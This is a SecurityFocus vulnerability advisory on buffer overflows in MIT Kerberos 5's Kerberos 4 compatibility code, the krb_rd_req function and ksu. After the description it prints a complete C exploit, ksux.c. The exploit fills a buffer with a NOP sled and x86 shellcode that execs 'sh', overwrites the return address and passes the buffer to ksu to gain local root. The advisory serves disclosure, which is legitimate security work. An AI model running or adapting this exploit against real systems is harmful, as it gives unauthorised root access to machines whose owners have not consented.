source: http://www.securityfocus.com/bid/1220/info
 
 
Several buffer overflow vulnerabilities exist in Kerberos 5 implmenetations due to buffer overflows in the Kerberos 4 compatability code. These include MIT Kerberos 5 releases 1.0.x, 1.1 and 1.1.1, MIT Kerberos 4 patch level 10 (and, most likely, prior releases), and Cygnus KerbNet and Network Security (CNS). The main source of problems is due to a buffer overflow in the krb_rd_req() library function. This function is used by every application that supports Kerberos 4 authentication, including, but not limited to, kshrd, klogin, telnetd, ftpd, rkinitd, v4rcp and kpopd. Therefore, it is possible for a remote attacker to exploit this vulnerability and gain root access on affected machines, or obtain root level access once local.
 
A setuid version of v4rcp is shipped with RedHat Linux 6.2, as part of a full install. It is possible to use this program, to obtain root level access.
 
In addition, there are other buffer overruns present in the ksu and krshd sources from MIT. These problems will be remedied in the same release from MIT that fixes the krrb_rd_req() vulnerability.

/********
 * ksux.c -- ksu exploit
 * written January 26, 2000
 * Jim Paris <jim@jtan.com>
 * 
 * This program exploits a vulnerability in the 'ksu' utility included
 * with the MIT Kerberos distribution.  Versions prior to 1.1.1 are   
 * vulnerable.
 * 
 * This exploit is for Linux/x86 with Kerberos version 1.0.  Exploits
 * for other operating systems and versions of Kerberos should also work.
 * 
 * Since krb5_parse_name will reject input with an @ or /, this shellcode
 * execs 'sh' instead of '/bin/sh'.  As a result, a copy of 'sh' must    
 * reside in the current directory for the exploit to work. 
 * 
 */
   
#include <stdlib.h>
#include <stdio.h> 

int get_esp(void) { __asm__("movl %esp,%eax"); }

char *shellcode="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x02\x89\x46"
                "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
                "\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xffsh"; 
                
#define         LEN 0x300
#define  RET_OFFSET 0x240
#define  JMP_OFFSET 0x240
#define CODE_OFFSET 0x100

int main(int argc, char *argv[])
{
  int esp=get_esp();
  int i,j; char b[LEN];
  
  memset(b,0x90,LEN);
  memcpy(b+CODE_OFFSET,shellcode,strlen(shellcode));
  *(int *)&b[RET_OFFSET]=esp+JMP_OFFSET;
  b[RET_OFFSET+4]=0;
  
  execlp("ksu","ksu","-n",b,NULL);
}